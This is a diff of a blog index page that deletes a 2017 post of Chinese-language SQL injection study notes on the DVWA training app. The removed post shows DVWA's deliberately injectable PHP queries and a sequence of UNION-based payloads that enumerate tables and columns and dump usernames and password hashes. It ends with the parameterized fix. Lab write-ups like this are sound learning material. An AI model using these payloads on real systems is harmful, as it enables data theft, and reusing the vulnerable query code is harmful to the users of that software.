@@ -62,7 +62,7 @@
     <div class="tagcloud-mask"></div>  
 <div class="tagcloud" id="tagcloud">
     <div class="tagcloud-inner">
-        <a href="/tags/SQL注入/" style="font-size: 14px;">SQL注入</a>
+        
     </div>
 </div>
     <header class="header" id="header">
@@ -172,7 +172,7 @@
                     </div>
                     <div class="mobile-nav-tagcloud">
                         <div class="mobile-tagcloud-inner">
-                            <a href="/tags/SQL注入/" style="font-size: 14px;">SQL注入</a>
+                            
                         </div>
                     </div>
                 </div>
@@ -209,64 +209,6 @@
     
 
 <section class="posts">
-    
-        
-    <article class="post">
-        <header class="post-header">
-            <div class="post-time syuanpi riseIn-light back-1">
-                <span>November 3, 2017</span>
-                
-            </div>
-            <h1 class="post-title syuanpi riseIn-light back-2">
-            
-                <a href="/2017/11/03/SQL注入学习笔记／DVWA/">SQL注入学习笔记／DVWA</a>
-            
-            </h1>
-            
-        </header>
-        <div class="post-content syuanpi riseIn-light back-3">
-            
-                
-                    <h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><p>##0.服务端核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123; </div><div class="line">    <span class="comment">// Get input </span></div><div class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ]; </div><div class="line"></div><div class="line">    <span class="comment">// Check database </span></div><div class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </div><div class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </div><div class="line"></div><div class="line">    <span class="comment">// Get results </span></div><div class="line">    $num = mysql_numrows( $result ); </div><div class="line">    $i   = <span class="number">0</span>; </div><div class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </div><div class="line">        <span class="comment">// Get values </span></div><div class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </div><div class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </div><div class="line"></div><div class="line">        <span class="comment">// Feedback for end user </span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </div><div class="line"></div><div class="line">        <span class="comment">// Increase loop count </span></div><div class="line">        $i++; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    mysql_close(); </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="1-判断字符or数字"><a href="#1-判断字符or数字" class="headerlink" title="1. 判断字符or数字"></a>1. 判断字符or数字</h2><p><code>1’ or 1 = 1#</code></p>
-<h2 id="2-查询语句字段数"><a href="#2-查询语句字段数" class="headerlink" title="2. 查询语句字段数"></a>2. 查询语句字段数</h2><p><code>1&#39; or 1 = 1 order by #</code></p>
-<h2 id="3-确定显示的字段数顺序"><a href="#3-确定显示的字段数顺序" class="headerlink" title="3. 确定显示的字段数顺序"></a>3. 确定显示的字段数顺序</h2><p><code>1&#39; union select 1,2 #</code></p>
-<h2 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4. 获取当前数据库"></a>4. 获取当前数据库</h2><p><code>1&#39; union select 1,database() #</code></p>
-<h2 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5. 获取数据库中的表"></a>5. 获取数据库中的表</h2><p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() #</code></p>
-<h2 id="6-获取表中字段名"><a href="#6-获取表中字段名" class="headerlink" title="6. 获取表中字段名"></a>6. 获取表中字段名</h2><p><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;user&#39;  #</code></p>
-<h2 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7. 下载数据"></a>7. 下载数据</h2><p><code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
-<h2 id="8-Tips"><a href="#8-Tips" class="headerlink" title="8. Tips"></a>8. Tips</h2><ul>
-<li><em>information_schema</em> 库</li>
-</ul>
-<ul>
-<li><p><em>schemata</em> 表 <em>schema_name</em> 列</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fl4npjy2bjj30ek082dh5.jpg" alt=""></p>
-</li>
-<li><p><em>columns</em> 表 <em>table_schema</em>、<em>column_name</em> 和 <em>table_name</em> 列</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fl4nwj4j2hj30lu0fkn01.jpg" alt=""></p>
-</li>
-<li><p><em>group_concat</em></p>
-</li>
-</ul>
-<h1 id="安全级别medium"><a href="#安全级别medium" class="headerlink" title="安全级别medium"></a>安全级别medium</h1><h2 id="0-服务端核心代码"><a href="#0-服务端核心代码" class="headerlink" title="0. 服务端核心代码"></a>0. 服务端核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </div><div class="line">    <span class="comment">// Get input </span></div><div class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </div><div class="line"></div><div class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id); </div><div class="line"></div><div class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </div><div class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> ); </div><div class="line"></div><div class="line">    <span class="comment">// Get results </span></div><div class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </div><div class="line">        <span class="comment">// Display values </span></div><div class="line">        $first = $row[<span class="string">"first_name"</span>]; </div><div class="line">        $last  = $row[<span class="string">"last_name"</span>]; </div><div class="line"></div><div class="line">        <span class="comment">// Feedback for end user </span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">// This is used later on in the index.php page </span></div><div class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts </span></div><div class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>; </div><div class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</div><div class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>]; </div><div class="line"></div><div class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="1-Burpsuite使用"><a href="#1-Burpsuite使用" class="headerlink" title="1. Burpsuite使用"></a>1. Burpsuite使用</h2><h2 id="2-确认数字型注入"><a href="#2-确认数字型注入" class="headerlink" title="2. 确认数字型注入"></a>2. 确认数字型注入</h2><h2 id="3-获取表中字段名"><a href="#3-获取表中字段名" class="headerlink" title="3. 获取表中字段名"></a>3. 获取表中字段名</h2><ul>
-<li><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;  #</code> 错误 “<code>&#39;</code>”被过滤了</li>
-<li><code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #</code> 成功</li>
-</ul>
-<h2 id="4-Tips"><a href="#4-Tips" class="headerlink" title="4.Tips"></a>4.Tips</h2><p>mysql_real_escape_string函数是实现转义 SQL 语句字符串中的特殊字符：“\x00”、“\n”、“\r”、“\“、” ’ “、“ ” “、”x1a” 会在前加”\”    </p>
-<h1 id="安全级别high"><a href="#安全级别high" class="headerlink" title="安全级别high"></a>安全级别high</h1><h2 id="0-服务端核心代码-1"><a href="#0-服务端核心代码-1" class="headerlink" title="0. 服务端核心代码"></a>0. 服务端核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123; </div><div class="line">    <span class="comment">// Get input </span></div><div class="line">    $id = $_SESSION[ <span class="string">'id'</span> ]; </div><div class="line"></div><div class="line">    <span class="comment">// Check database </span></div><div class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </div><div class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </div><div class="line"></div><div class="line">    <span class="comment">// Get results </span></div><div class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </div><div class="line">        <span class="comment">// Get values </span></div><div class="line">        $first = $row[<span class="string">"first_name"</span>]; </div><div class="line">        $last  = $row[<span class="string">"last_name"</span>]; </div><div class="line"></div><div class="line">        <span class="comment">// Feedback for end user </span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>字符型注入\防止sqlmap</p>
-<h1 id="安全级别impossible"><a href="#安全级别impossible" class="headerlink" title="安全级别impossible"></a>安全级别impossible</h1><h2 id="0-服务端核心代码-2"><a href="#0-服务端核心代码-2" class="headerlink" title="0. 服务端核心代码"></a>0. 服务端核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </div><div class="line">    <span class="comment">// Check Anti-CSRF token </span></div><div class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </div><div class="line"></div><div class="line">    <span class="comment">// Get input </span></div><div class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </div><div class="line"></div><div class="line">    <span class="comment">// Was a number entered? </span></div><div class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </div><div class="line">        <span class="comment">// Check the database </span></div><div class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </div><div class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </div><div class="line">        $data-&gt;execute(); </div><div class="line">        $row = $data-&gt;fetch(); </div><div class="line"></div><div class="line">        <span class="comment">// Make sure only 1 result is returned </span></div><div class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </div><div class="line">            <span class="comment">// Get values </span></div><div class="line">            $first = $row[ <span class="string">'first_name'</span> ]; </div><div class="line">            $last  = $row[ <span class="string">'last_name'</span> ]; </div><div class="line"></div><div class="line">            <span class="comment">// Feedback for end user </span></div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">// Generate Anti-CSRF token </span></div><div class="line">generateSessionToken(); </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-
-                
-            
-        
-        </div>
-        
-    </article>
-    
-
     
         
     <article class="post">
@@ -323,7 +265,7 @@
             <div class="copyright">
     <div class="info">
         <span>&copy;</span>
-        <span>1970 ~ 2017</span>
+        <span>1970 ~ 2019</span>
         <span>❤</span>
         <span>darkcyan</span>
     </div>
